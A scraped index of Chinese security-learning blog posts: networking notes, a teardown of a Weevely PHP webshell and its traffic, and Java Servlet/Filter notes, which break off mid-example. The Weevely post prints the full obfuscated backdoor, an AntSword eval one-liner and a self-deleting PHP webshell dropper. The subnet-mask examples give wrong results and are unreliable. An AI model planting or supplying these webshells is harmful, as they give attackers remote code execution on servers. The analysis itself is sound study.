集线器\n全称应该是”以太网集线器“，\n将多条以太网双绞线或光纤集合连接在同一段物理介质下的设备。 集线器是运作在OSI模型中的物理层，可以让其链接的设备工作在同一网段。 集线器上有多个I/O端口，信号从任意一个端口进入后，会从其他端口出现。 交换机\n可以认为交换机的每个网线接口后面都是一块网卡。\n但交换机的工作方式和网卡有一点不同。\n网卡本身具有 MAC 地址，并通过核对收到的包的接收方 MAC 地址判断是不是发给自己的，如果不是发给自己的则丢弃； 交换机的端口不核对接收方 MAC 地址，而是直接接收所有的包并存放到缓冲区中。因此，和网卡不同，交换机的端口不具有 MAC 地址 ！！！ 交换机有MAC模块，负责讲接收到的经过处理过的信号转为数字信号，进行后续的处理，最后放入缓冲区。\n交换机内部的MAC地址表的维护\n交换机在转发包的过程中，还需要对 MAC 地址表的内容进行维护，维护操作分为两种。\n第一种，交换机收到网络包\n将sender的MAC地址和发进来的端口号记录在MAC地址表中 这个记录以后可以作为以后向该sender发消息的地址 交换机每次收到包（sender不限啊）都进行记录 第二种，删除记录。\n当该以太网内某台设备移动了，该记录就要删除，不然通信将出现错误 删除一般是用时间来作为判定标准，过期的就会被自动删除。 不删除导致的通信错误，通俗的讲，就是，人去世了，尝试给其打电话。 路由器\n路由器和交换机很相似，不过路由器是基于 IP 设计的，而交换机是基于以太网设计的\n一些对比更好区分：\n计算机的网卡除了以太网和无线局域网之外很少见到支持其他通信技术的品种， 路由器的端口模块则支持除局域网之外的多种通信技术，如 ADSL、FTTH，以及各种宽带专线等，只要端口模块安装了支持这些技术的硬件即可 转发模块会根据接收到的包中的接收方 IP 地址，在路由表中进行查询，以此判断转发目标。然后，转发模块将包转移到转发目标对应的端口，端口再按照硬件的规则将包发送出去\n路由器的端口具有 MAC 地址 ，因此它就能够成为以太网的发送方和接收方 。端口还具有 IP 地址，从这个意义上来说，它和计算机的网卡是一样的\n路由器的各个端口都具有 MAC 地址和 IP 地址:\n前者使其可以成为以太网的sender和receiver 后者，让其和网卡一样 路由表\n路由表的子网掩码列只表示在匹配网络包目标地址时需要对比的比特数量。 这句话的理解：\nIP最后一个.后面的数字是主机号，前面的都是网络号，子网掩码与IP进行与运算，得到的就是子网。\nA电脑：192.168.0.1 \u0026amp; 255.255.255.0 = 12.132.186.40\nB电脑：192.168.0.2 \u0026amp; 255.255.255.0 = 12.132.186.40\nC电脑：192.168.1.1 \u0026amp; 255.255.255.0 = 12.132.186.80\nD电脑：192.168.1.2 \u0026amp; 255.255.255.0 = 12.132.186.80\n","date":"2024-05-29T20:22:51+08:00","permalink":"https://66lueflam144.github.io/p/b576aef/","title":"网络是怎样连接的2.0"},{"content":"0 通过weevely生成了一个php后门文件\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $u=\u0026#39;){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch(\u0026#34;/$k8ih8i(.+)$8ik8if8i/\u0026#34;,@file_get_contents(\u0026#34;p8ihp://8ii8\u0026#39;; $v=\u0026#39;input\u0026#34;),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge\u0026#39;; $h=\u0026#39;t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i\u0026#34;$p$kh$r$kf\u0026#34;);}\u0026#39;; $d=str_replace(\u0026#39;D\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;cDrDeDaDDte_fuDnction\u0026#39;); $k=\u0026#39;$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io=\u0026#34;\u0026#34;;for($i=08i;$i\u0026lt;$l;8i){fo8ir($8ij=0;($j\u0026lt;$c\u0026amp;\u0026amp;$i8i\u0026lt;$l);8i$j+8i+,$i+8i+\u0026#39;; $Y=\u0026#39;$k=\u0026#34;88i8ic319f28\u0026#34;;8i$kh8i=\u0026#34;d81d1527a8i942\u0026#34;8i;$kf=\u0026#34;8e98ia5c2195f5\u0026#34;8i;8i$p=\u0026#34;ZnC8it8iZbYs8iDzbbdvRw\u0026#34;;8ifunction 8ix($t,8i\u0026#39;; $A=str_replace(\u0026#39;8i\u0026#39;,\u0026#39;\u0026#39;,$Y.$k.$u.$v.$h); $b=$d(\u0026#39;\u0026#39;,$A);$b(); ?\u0026gt; 不算难理解，分解一下： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php //第一部分： $u=\u0026#39;){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch(\u0026#34;/$k8ih8i(.+)$8ik8if8i/\u0026#34;,@file_get_contents(\u0026#34;p8ihp://8ii8\u0026#39;; $v=\u0026#39;input\u0026#34;),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge\u0026#39;; $h=\u0026#39;t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i\u0026#34;$p$kh$r$kf\u0026#34;);}\u0026#39;; $k=\u0026#39;$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io=\u0026#34;\u0026#34;;for($i=08i;$i\u0026lt;$l;8i){fo8ir($8ij=0;($j\u0026lt;$c\u0026amp;\u0026amp;$i8i\u0026lt;$l);8i$j+8i+,$i+8i+\u0026#39;; $Y=\u0026#39;$k=\u0026#34;88i8ic319f28\u0026#34;;8i$kh8i=\u0026#34;d81d1527a8i942\u0026#34;8i;$kf=\u0026#34;8e98ia5c2195f5\u0026#34;8i;8i$p=\u0026#34;ZnC8it8iZbYs8iDzbbdvRw\u0026#34;;8ifunction 8ix($t,8i\u0026#39;; $A=str_replace(\u0026#39;8i\u0026#39;,\u0026#39;\u0026#39;,$Y.$k.$u.$v.$h); //第二部分 $d=str_replace(\u0026#39;D\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;cDrDeDaDDte_fuDnction\u0026#39;); $b=$d(\u0026#39;\u0026#39;,$A); $b(); ?\u0026gt; 第一部分 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $k=\u0026#34;8c319f28\u0026#34;; $kh=\u0026#34;d81d1527a942\u0026#34;; $kf=\u0026#34;8e9a5c2195f5\u0026#34;; $p=\u0026#34;ZnCtZbYsDzbbdvRw\u0026#34;; function x($t, $k) { $c = strlen($k); $l = strlen($t); $o = \u0026#34;\u0026#34;; for ($i = 0; $i \u0026lt; $l;) { for ($j = 0; ($j \u0026lt; $c \u0026amp;\u0026amp; $i \u0026lt; $l); $j++, $i++) { $o .= $t{$i} ^ $k{$j}; } } return $o; } if(@preg_match(\u0026#34;/$kh(.+)$kf/\u0026#34;,@file_get_contents(\u0026#34;php://input\u0026#34;),$m)==1) { @ob_start(); @eval(@gzuncompress(@x(@base64_decode($m[1]),$k))); $o=@ob_get_contents();//获取当前缓冲区的内容，并返回缓冲区的数据 @ob_end_clean();//停止输出缓冲并清空缓冲区的内容，同时关闭输出缓冲区 $r=@base64_encode(@x(@gzcompress($o),$k)); print(\u0026#34;$p$kh$r$kf\u0026#34;);} if \u0026quot;/$kh(.+)$kf/\u0026quot; ()标记一个子表达式的开始和结束位置。 .匹配除换行符之外的任何单个字符 +匹配前面的子表达式0次或者多次 写一个例子来理解： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $k = \u0026#39;cr\u0026#39;; $s = \u0026#39;ke\u0026#39;; $a = \u0026#39;cream soda you know i like it like that \u0026#39;; $c = preg_match(\u0026#34;/$k(.+)$s/\u0026#34;, $a, $cc); var_dump($cc); /*结果： array(2) { [0] =\u0026gt; string(34) \u0026#34;cream soda you know i like it like\u0026#34; [1] =\u0026gt; string(30) \u0026#34;eam soda you know i like it li\u0026#34; } */ 所以整个正则表达式的意思其实是：匹配$k开头的$s结尾的，中间的任意的字符串。 这其中需要注意的是：$cc 存储了两个元素: • 第一个元素$cc[0]，用来存储按照表达式匹配到的完整字符串，也就是***cream soda you know i like it like__，可以看到，和原字符串对比，少了结尾的_that_ • 第二个元素$cc[1]，用来存储捕获组匹配到的内容，也就是eam soda you know i like it li，少了开头的_cr⇒$k*，结尾的_ke⇒$s @file_get_contents 一个php函数，加上了@隐藏报错 将 整个文件读入一个字符串\nphp://input是一个只读流， 从请求正文中读取原始数据\n合起来意思就是：从请求中读取内容。\n所以对于第一句条件 @preg_match**(**\u0026quot;/$kh(.+)$kf/\u0026quot;,@file_get_contents**(**\u0026quot;php://input\u0026quot;**)**,$m**)**==1**)** ：\n如果在post请求中匹配到 $kh(.+)$kf ，就存入 $m 中\n然后ob_start()\n• ob_start() 是 PHP 中的一个函数，用于开启输出缓冲。\n• 在 PHP 中，当输出到浏览器或者其他输出目标时，通常是立即发送给客户端的。但有时候，我们可能希望先将输出内容暂时存储起来，等待进一步处理或者在某个时机再发送给客户端，这时就可以使用输出缓冲。\n•ob_start() 函数的作用就是开启输出缓冲。\n• 一旦调用了 ob_start()，PHP 将会把后续所有的输出都缓冲起来，而不会立即发送到浏览器。\n• 当需要将缓冲内容发送到浏览器时，可以使用 ob_end_flush() 或者 ob_flush() 函数来完成。\n• 使用输出缓冲的一个常见场景是，当需要在 PHP 脚本中生成一些输出内容，但又希望在输出之前对其进行处理，比如对输出内容进行压缩、修改或者日志记录等操作时。\nfunction x AKA异或操作函数\n异或：主要用来判断两个值是否不同\n1 2 3 4 5 6 7 8 9 10 11 12 13 原始版本 0 ^ 0 = 0 0 ^ 1 = 1 1 ^ 0 = 1 1 ^ 1 = 0 字符版本 a ^ b ^ c ^ a ^ b = a ^ a ^ b ^ b ^ c = 0 ^ 0 ^ c = c 文本串行的每个字符可以通过与给定的密钥进行 按位异或运算来加密。 如果要解密，只需要将加密后的结果与密钥再次 进行按位异或运算即可。\n举例：\n第一次异或结果：string(10) \u0026ldquo;一串乱码（bushi）\u0026rdquo; 第二次异或结果：string(10) \u0026ldquo;wild wagei\u0026rdquo; 剩下的 @gzuncompress: 用于解压缩经过gzip压缩的字符串。 @base64_decode: 用于对经过base64编码的数据进行解码。 @base64_encode:对数据进行base64编码。 第二部分 1 2 3 $d=str_replace(\u0026#39;D\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;cDrDeDaDDte_fuDnction\u0026#39;);//替换之后得到create_function $b=$d(\u0026#39;\u0026#39;,$A); $b(); create_function 是 PHP 中的一个函数，用于动态创建一个匿名函数（lambda 函数）。\n通过 **create_function** 函数，可以根据传入的参数和代码字符串创建一个匿名函数，并返回一个唯一的函数名。\n查了一下官方手册，写了一个demo进行理解\n1 2 3 4 5 $newfunc = create_function(\u0026#39;\u0026#39;, \u0026#39;echo \u0026#34;Hello, World!\u0026#34;;\u0026#39;); $newfunc(); // 输出 Hello, World! $func = create_function(\u0026#39;$arg1, $arg2\u0026#39;, \u0026#39;\u0026#39;); $result = $func(1, 2); // 这个调用不会执行任何操作，因为函数体为空 所以第一部分就是：\n替换之后得到create_function $A作为函数体进行执行 结果存入$b $b执行 Weevelt code bd：提供后门代码生成模板 core：核心生成与连接处理代码 modules：可运行指令的处理模板 utills：没看 weevely.py：index文件 通读是不可能的，所以使用报错找到调用链——修改了生成的后门文件进行连接操作 …………\n所以就在图上了。\n下面直接写重点函数\n加密obfpost.py __init__(self, url, password) 将得到的密码参数进行md5，十六进制、小写处理后，得到一个32位的”乱码“\n前8位作为shared_key 中间12位作为header 最后12位作为trailer 所以按照这个思路写一个demo\n1 2 3 4 5 6 password = \u0026#39;smart\u0026#39; passwordhash = haslib.md5(password).hexdigest().lower() shared_key = passwordhash[:8].encode(\u0026#39;utf-8\u0026#39;) header = passwordhash[8:20].encode(\u0026#39;utf-8\u0026#39;) trailer = passwordhash[20:32].encode(\u0026#39;utf-8\u0026#39;) 得到的结果是\n1 2 3 4 5 passwordhash: 8c319f28d81d1527a9428e9a5c2195f5 shared_key: 8c319f28 header: d81d1527a942 trailer: 8e9a5c2195f5 回到最开始的生成的后门文件中，\n1 2 3 4 $k=\u0026#34;8c319f28\u0026#34;; $kh=\u0026#34;d81d1527a942\u0026#34;; $kf=\u0026#34;8e9a5c2195f5\u0026#34;; $p=\u0026#34;ZnCtZbYsDzbbdvRw\u0026#34;;//后面会解释是什么 可以发现前三个都对应上了。\nsend() 也不算难理解\n不过最后一句是关键，也是整个payload的拆解关键 提一下第一张图片中的两句 由字符集string.printable (包含ASCII 可打印 字符的全部字符，即包括数字、大小写字母、 标点符号和空格)中的随机字符组成的长度 为 16 的字符串\n简单说就是，PREPEND和APPEND的值都是随机的，长度均为16 于是按照第二张图的思路：\n这里的原始payload是@eval(phpinfo()) 经过xor、obfuscated、wrappped之后，得到了最后会发送出去的payload。\n关于如何发送payload的\nopener = urllib.request.build_opener(*additional_handlers)：发送payload并获取响应内容\n获取到的响应又通过\n1 2 3 4 5 response = zlib.decompress( utils.string.sxor( base64.b64decode(matched.group(1)), self.shared_key) ) 进行解码。\n和生成的后门文件一个逻辑。 所以那边也是，接收到payload后，解码并执行，也就是\n1 2 3 $d=str_replace(\u0026#39;D\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;cDrDeDaDDte_fuDnction\u0026#39;); $b=$d(\u0026#39;\u0026#39;,$A); $b(); 这部分的意义。\n流量分析 攻击者发给受害者 一个编写好的目录遍历命令：\n其解码后内容是：\n1 2 3 4 5 6 7 8 9 10 11 chdir(\u0026#39;xxx\\xx\u0026#39;);@error_reporting(0); $p=\u0026#34;.\u0026#34;; if(@is_dir($p)){ $d=@opendir($p); $a=arrray(); if($d){ while(($f=@readdir($d))) $a[]=$f; sort($a); print(join(PHP_EOL,$a));\t} } ps：这个是file_ls功能的代码，不是自己写的。\n受害者发给攻击者 于是这是返回过来的信息\n解码之后得到：\n番外1-与antisword的对比（easiest version） 后门文件 antisword的常用后门就是一句话木马系列\n1 \u0026lt;?php @eval($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 与weeevely的相比：\n简洁程度不是一倍两倍 被抓到的容易程度也不是一倍两倍。 流量分析 这是抓取的流量中，antisword发送的代码的部分内容\n流量分析得到antisword发送的 post内容——只是简单的进行了 URL编码 可以看出来是一个对目录进行遍 历以及获取，最后将数据返回的 代码 将进行处理的代码在post中传输， 而weevely是将其写入后门文件 返回的流量分析： 截断符号进行获取数据流， 十六进制转换二进制 比起weevely的异或、base64、 gzip，简洁很多\n解码后： 总结 Weevely： 完全始祖版本^^\n**Antisword**： - 后门文件更友好，同时也很容易被识别 (最基础版本) - 因为后门中没有特别多涉及处理代码， 所以被发现，也顶多知道攻击者通过这 个后门文件得到了什么，而不是得到其 逆向处理逻辑。 番外2-内存马 1 2 3 4 5 6 7 8 9 10 \u0026lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE___); while(1){ $content = \u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;123\u0026#34;]) ?\u0026gt;\u0026#39;; file_put_contents(\u0026#34;11.php\u0026#34;, $content); usleep(10000); } ?\u0026gt; 一个典型的PHP内存马 与前面的木马对比，最大的 特点和优势就是:\n存在于内 存中，不需要文件落地。 这 也意味着很难被查杀。 参考\nWeevelywebshelll协议分析文档\nweevely code\n蚁剑流量分析\n","date":"2024-05-10T18:53:11+08:00","permalink":"https://66lueflam144.github.io/p/03215d8/","title":"Weevely_wish"},{"content":"对java的重要三组件再次看了一遍。\nps： hugo new posts//post_2/S_L_F.md\nJava三剑客\u0026amp;Tomcat Servlet 💡 JavaEE的规范接口之一，运行在服务器上的一个java程序，用来接收客户端发送过来的请求并进行处理，然后响应给客户端。\n一点补充 1.Servlet必须封装在WAR（web应用程序式保存文档）或者Web模组中，才能部署到应用程序式（web）服务器。\n2.由1.可得，Servlet程序由web服务器调用（对其进行生命周期的管理）。当应用加载一个Servlet的时候，从初始化到销毁，期间会发生一系列的事件（Servlet的生命周期事件或方法）。\n3.可以支持动态网页内容，同时对多个用户端提供服务。\n容器指Tomcat\nServlet的生命周期 Servlet构造器：Servlet的加载\ninit初始化：Servlet的实例化，\n- 对于一个Servlet，init方法只能调用一次。无论有多少客户机访问Servlet，都不会重复执行init()。\n- init方法有一个类型为ServletConfig的参数，Servlet容器通过这个参数向Servlet传递配置信息，通过ServletConfig对象获取描述Servlet运行环境的ServletContext对象，使用该对象，Servlet可以和它的Servlet容器进行通信。\nservice方法：Servlet的服务 - Servlet初始化之后，将一直存在于容器中（内存马的基础）\n- 1.客户端发送GET请求，调用Servlet的doGet方法进行处理并响应\n- 2.客户端发送POST请求，调用Servlet的doPost方法处理并响应\n- 3.service方法处理用户请求。\n- 每当由一个对HttpServlet对象的请求，该对象的service方法就调用且获得请求对象ServletRequest和响应对象ServletResponse作为参数。\n- Servlet对象通过ServletRequest对象（得到客户端的相关信息和请求信息，处理之后，调用ServletResponse对象的方法设置响应信息。\ndestroy销毁：在web工程停止的时候调用，Servlet的销毁 一个总结：\n在正常情况下，Servlet只会初始化一次，而处理服务会调用多次，销毁也只会调用一次；\n但是如果一个Servlet长时间不使用的话，也会被容器自动销毁，\n而如果需要再次使用时会重新进行初始化的操作，即在特殊情况下初始化可能会进行多次，销毁也可能进行多次。\n## Servlet的任务 接收请求 - 将请求封装为ServletRequest对象，包含请求头、参数等各种信息\n处理请求 - 在service中接收参数，并进行处理\n数据响应 - 请求处理完成后，通过**转发（Forward）或者重定向（Redirect）**到某个页面\n## Servlet容器（Tomcat为例） ### Tomcat容器4个等级（由高到低）（结合图看）： Container\nEngine\nHost\nServlet：包含Context容器（1 or more），一个Context对应一个Web工程，同时Context直接管理Servlet在容器中的包装类Wrapper，so Context直接影响Servlet的工作方式。\n（其实目前4张图片，三张都在说同一件事）\n容器的生命周期 （和Servlet的生命周期大同小异）\n加载与实例化：容器启动时，读取web.xml中内容，容器中无实例化Servlet对象，则实例化一个（创建web.xml指定的ServletConfig对象，并将其作为参数来进行下一步的Servlet对象的init方法调用）。 - ServletConfig对象和Servlet实例的关系：\n- 每个Servlet实例对应一个ServletConfig对象，由容器创建，并进行相关联\n- ServletConfig储存Servlet初始化参数\n- ServletConfig对象可以获取ServletContext对象（整个web应用程序的上下文）\n- ServletContext是容器给每一个web应用程序创建的一个全局对象（资源）（该程序的所有Servlet都可以访问），提供一系列方法，Servlet用来进行与容器的交互，belike 获取初始化参数、读取资源文件之类的.\n初始化：调用Servlet对象的init进行初始化，详情参考上面的Servlet的生命周\n处理请求：same\n销毁：容器移除一个Servlet就调用其destroy方法（完全残忍）\n## Servlet的线程安全 point：\nProblem：Servlet是单实例多线程的，也就是，一个类一个实例多个线程（访问） - 如果存在可以修改的成员变量，就存在多个线程同时访问和修改这些变量，导致数据竞争（数据不一致）、死锁等问题。\nAnswer：使用Servlet最好无状态 - 无可修改的成员变量\n- 每次请求都是独立的，不会受到之前的请求的影响\n- 好处是：易于维护\n## 实现 客户端通过URL地址访问web服务器中的资源，Servlet程序映射到一个URL地址上\n在web.xml中的映射实现，例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;servlet\u0026gt;// 注册Servlet \u0026lt;servlet-name\u0026gt;FirstServlet\u0026lt;/servlet-name\u0026gt; //设置Servlet类一个逻辑名称，用于在容器内进行标识 \u0026lt;servlet-class\u0026gt;FirstServlet\u0026lt;/servlet-class\u0026gt; //Servlet的类名，就是写了实现代码的类的名字 \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; //用于映射上面的Servlet的对外访问路径 \u0026lt;servlet-name\u0026gt;FirstServlet\u0026lt;/servlet-name\u0026gt; //设置引用的Servlet名称，也就是上面那个的名称 \u0026lt;url-pattern\u0026gt;/FirstServlet\u0026lt;/url-pattern\u0026gt; //servlet对外的访问路径，当访问/FirstServlet的时候，就会将请求转发到指定的Servlet类 \u0026lt;/servlet-mapping\u0026gt; ps：转发：客户端只发送一次请求，在服务端进行转发，可以共享数据，浏览器URL不变。 一个简单的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 //web.xml \u0026lt;!DOCTYPE web-app PUBLIC \u0026#34;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\u0026#34; \u0026#34;http://java.sun.com/dtd/web-app_2_3.dtd\u0026#34; \u0026gt; \u0026lt;web-app\u0026gt; \u0026lt;display-name\u0026gt;Archetype Created Web Application\u0026lt;/display-name\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;Servlet1\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;Servlet1\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;Servlet1\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/hello\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; //Servlet1.java import java.io.*; import javax.servlet.*; import javax.servlet.http.*; // 扩展 HttpServlet 类 public class Servlet1 extends HttpServlet { private String message; public void init() throws ServletException { // 执行必需的初始化 message = \u0026#34;Hello World\u0026#34;; } public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // 设置响应内容类型 response.setContentType(\u0026#34;text/html\u0026#34;); // 实际的逻辑是在这里 PrintWriter out = response.getWriter(); out.println(\u0026#34;\u0026lt;h1\u0026gt;\u0026#34; + message + \u0026#34;\u0026lt;/h1\u0026gt;\u0026#34;); } public void destroy() { // 什么也不做 } } 注意一下，IDEA需要映射URL到这个项目的deploy名 belike this is http://localhost:8080/ServletDemo2_war/hello\n然后\nFilter 💡 请求一个资源或者从一个资源返回信息的时候执行过滤操作的中间件。\n详细点is，请求到达Servlet之前进行过滤、响应从Servlet发出后进行过滤。\nFilter本身并不申请请求对象和响应对象，只提供过滤功能。\n## Filter的执行顺序 如果定义了多个Filter，且同一个请求会被多个Filter进行处理，那么顺序就来自于web.xml中的顺序，从上到下执行。\nFilter接口中有一个doFilter方法，当Filter配置好对哪个资源进行拦截的时候，服务器就会在每次调用该资源之前先调用doFilter方法（执行一段代码）\n调用doFilter方法的时候，会传递一个filterChain对象（提供一个doFilter方法）\n如果调用filterChain对象的doFilter方法，那么服务器就会调用web资源的service方法——该资源被访问。（在调用目标资源之前，执行一段代码，与上面的同理）\n## Filter生命周期 加载和实例化 - 容器启动时，根据web.xml中的filter声明进行实例化\n- 容器启动时执行，只会执行一次\n初始化 - 调用FilterConfig进行初始化filter，类似ServlertConfig\n- 利用FilterConfig可以得到ServletContext对象，以及在web.xml中的filter的初始化参数\n- 容器启动时执行，只会执行一次\ndoFilter - 类似Servlet的service方法\n- 客户端请求资源，容器匹配到filter-mapping所指url-pa，则按照声明的顺序依次调用这些filter的doFilter方法\n销毁 - 容器调用其destroy方法进行销毁，被销毁的filter使用的资源也会被释放\n## 创建Filter IDEA提供了三剑客的模板class，所以直接使用+修改修改\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 //Filter1.java package com.test.Filters; import javax.servlet.*; import java.io.IOException; import java.util.*; public class Filter1 implements Filter{ public void init(FilterConfig config) throws ServletException { String site = config.getInitParameter(\u0026#34;site\u0026#34;); System.out.println(\u0026#34;name of website: \u0026#34; + site); } public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { System.out.println(\u0026#34;I got a bad idea...\u0026#34;); chain.doFilter(request, response); } public void destroy(){ System.out.println(\u0026#34;Destroy!!!\u0026#34;); } } //web.xml \u0026lt;!DOCTYPE web-app PUBLIC \u0026#34;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\u0026#34; \u0026#34;http://java.sun.com/dtd/web-app_2_3.dtd\u0026#34; \u0026gt; \u0026lt;web-app\u0026gt; \u0026lt;display-name\u0026gt;Archetype Created Web Application\u0026lt;/display-name\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;DisplayHeader\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.test.Servlets.DisplayHeader\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;DisplayHeader\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/hello\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;com.test.Filters.Filter1\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 //DisplayHeader.java，直接搬的菜鸟教程的。 package com.test.Servlets; import java.io.IOException; import java.io.PrintWriter; import java.util.Enumeration; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; @WebServlet(\u0026#34;/DisplayHeader\u0026#34;) //扩展 HttpServlet 类 public class DisplayHeader extends HttpServlet { // 处理 GET 方法请求的方法 public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // 设置响应内容类型 response.setContentType(\u0026#34;text/html;charset=UTF-8\u0026#34;); PrintWriter out = response.getWriter(); String title = \u0026#34;HTTP Header 请求实例\u0026#34;; String docType = \u0026#34;\u0026lt;!DOCTYPE html\u0026gt; \\n\u0026#34;; out.println(docType + \u0026#34;\u0026lt;html\u0026gt;\\n\u0026#34; + \u0026#34;\u0026lt;head\u0026gt;\u0026lt;meta charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\u0026lt;title\u0026gt;\u0026#34; + title + \u0026#34;\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\\n\u0026#34;+ \u0026#34;\u0026lt;body bgcolor=\\\u0026#34;#f0f0f0\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34;\u0026lt;h1 align=\\\u0026#34;center\\\u0026#34;\u0026gt;\u0026#34; + title + \u0026#34;\u0026lt;/h1\u0026gt;\\n\u0026#34; + \u0026#34;\u0026lt;table width=\\\u0026#34;100%\\\u0026#34; border=\\\u0026#34;1\\\u0026#34; align=\\\u0026#34;center\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34;\u0026lt;tr bgcolor=\\\u0026#34;#949494\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34;\u0026lt;th\u0026gt;Header 名称\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Header 值\u0026lt;/th\u0026gt;\\n\u0026#34;+ \u0026#34;\u0026lt;/tr\u0026gt;\\n\u0026#34;); Enumeration headerNames = request.getHeaderNames(); while(headerNames.hasMoreElements()) { String paramName = (String)headerNames.nextElement(); out.print(\u0026#34;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#34; + paramName + \u0026#34;\u0026lt;/td\u0026gt;\\n\u0026#34;); String paramValue = request.getHeader(paramName); out.println(\u0026#34;\u0026lt;td\u0026gt; \u0026#34; + paramValue + \u0026#34;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\\n\u0026#34;); } out.println(\u0026#34;\u0026lt;/table\u0026gt;\\n\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;); } // 处理 POST 方法请求的方法 public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doGet(request, response); } } ## Filter如何filter something 映射过滤应用程序中所有资源 重点是url-pattern\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;com.test.Filters.Filter1\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;FilterTest\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; 过滤指定的类型文件资源 重点是url-pattern\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 